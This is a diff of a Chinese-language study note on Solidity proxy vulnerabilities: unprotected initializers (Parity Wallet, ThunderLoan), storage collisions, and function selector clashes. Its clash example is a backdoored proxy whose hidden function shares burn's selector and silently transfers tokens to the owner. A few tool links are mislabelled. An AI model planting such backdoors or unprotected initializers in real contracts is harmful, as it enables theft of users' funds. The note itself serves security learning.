@@ -7,7 +7,7 @@ title: ProxySecurity
 
 当自动调用合约构造函数时，为什么我们需要`initialize`函数？ 来自OpenZeppelin的解释：合约构造函数中的代码在部署时运行一次，但无法在代理合约的上下文中运行逻辑合约的构造函数代码。由于逻辑合约必须将`_initialized`变量的值存储在代理合约上下文中，因此构造函数不能用于此目的，因为实现合约的构造函数代码将始终在实现合约的上下文中运行。这就是实现合约中存在 `initialize` 函数的原因 - 因为 `initialize` 调用必须通过代理进行。由于初始化调用必须作为实现合约部署的单独步骤进行，因此可能会发生潜在的竞争条件，也应引起注意，例如使用地址控制修饰符保护 `initialize` 函数，以便只有特定的 `msg.sender` 可以初始化该函数。
 
-### Example
+### Example-1
 
 `Paroty Wallet`:
 ```solidity
@@ -21,7 +21,7 @@ _walletLibrary.delegatecall(msg.data);
 ```
 该`fallback()`使用`delegatecall`将所有不匹配的函数全部转发到了`library`中，也包括了`initialize`函数.
 
-`Paroty Wallet::initWallet()`:
+`Parity Wallet::initWallet()`:
 ```solidity
 // constructor - just pass on the owner array to the multiowned and  // the limit to daylimit  
 function initWallet(address[] _owners, uint _required, uint _daylimit) {    
@@ -31,11 +31,35 @@ function initWallet(address[] _owners, uint _required, uint _daylimit) {
 ```
 `initWallet()`没有权限控制，导致所有人都可以调用，攻击者可以轻松的将将`m_owners`状态变量修改成任意地址。
 
+### Example-2
+> From:Cyfrin-SecurityCouse-ThunderLoan
+```solidity title="OracleUpgradeable.sol"
+function __Oracle_init(address poolFactoryAddress) internal onlyInitializing {
+        __Oracle_init_unchained(poolFactoryAddress);
+    }
+```
+
+```solidity title="ThunderLoan.sol"
+function initialize(address tswapAddress) external initializer {
+        __Ownable_init(msg.sender);
+        __UUPSUpgradeable_init();
+        __Oracle_init(tswapAddress);
+        s_feePrecision = 1e18;
+        s_flashLoanFee = 3e15; // 0.3% ETH fee
+    }
+```
+
+### Mitigation
+- 在部署期间自动进行初始化。通过在部署期间自动调用初始化函数，开发人员可以降低忘记在部署后手动触发它的风险。这种策略不仅确保在部署合约后立即设置所有合约参数，而且还提供一致的测试和部署流程。
+
 ## 2.Storage Collision Vulnerability
 
 当逻辑合约中的slot布局和代理合约中的slot布局不匹配时，就会发生storage冲突，因为代理合约中的delegatecall意味着逻辑合约调用的是代理合约的storage，但是逻辑合约中的变量决定了数据存储的位置，如果他们直接不匹配，他们就会发生冲突。
 
 关于solidity内部存储的详细可以在这里查看:
+
+### Way to Find it
+可以使用[sol2num](https://github.com/naddison36/sol2uml),或者[slither[(https://github.com/naddison36/sol2uml),或者是[This](https://github.com/ItsNickBarry/hardhat-storage-layout-diff),或者使用`Foundry`的`inspect`来查看布局.
 
 ### Example
 Code from Solidity-by-example
@@ -184,6 +208,66 @@ contract Attack {
 大多数但并非所有代理类型都存在函数冲突。具体来说，UUPS 代理通常不易受到功能冲突的影响，因为实施合约存储了所有自定义功能。
 
 可以使用[这个工具](https://openchain.xyz/signatures)来寻找有相同selector的函数.
+
+### Example
+> From Tincho Blog
+```solidity
+pragma solidity ^0.5.0;
+
+contract Proxy {
+    
+    address public proxyOwner;
+    address public implementation;
+
+    constructor(address implementation) public {
+        proxyOwner = msg.sender;
+        _setImplementation(implementation);
+    }
+
+    modifier onlyProxyOwner() {
+        require(msg.sender == proxyOwner);
+        _;
+    }
+
+    function upgrade(address implementation) external onlyProxyOwner {
+        _setImplementation(implementation);
+    }
+
+    function _setImplementation(address imp) private {
+        implementation = imp;
+    }
+
+    function () payable external {
+        address impl = implementation;
+
+        assembly {
+            calldatacopy(0, 0, calldatasize)
+            let result := delegatecall(gas, impl, 0, calldatasize, 0, 0)
+            returndatacopy(0, 0, returndatasize)
+
+            switch result
+            case 0 { revert(0, returndatasize) }
+            default { return(0, returndatasize) }
+        }
+    }
+    
+    // This is the function we're adding now
+    function collate_propagate_storage(bytes16) external {
+        implementation.delegatecall(abi.encodeWithSignature(
+            "transfer(address,uint256)", proxyOwner, 1000
+        ));
+    }
+}
+```
+因为：
+```solidity
+$ pocketh selector "collate_propagate_storage(bytes16)"
+0x42966c68
+
+$ pocketh selector "burn(uint256)"
+0x42966c68
+```
+如果一个用户想要调用`burn()`，本来代理合约中没有`burn`函数所以会触发`fallback()`从而执行逻辑合约中的`burn`，但是因为函数选择器相同，所以`EVM`选择了执行`collate_propagate_storage(bytes16)`
 
 ### Refer
 https://forum.openzeppelin.com/t/beware-of-the-proxy-learn-how-to-exploit-function-clashing/1070
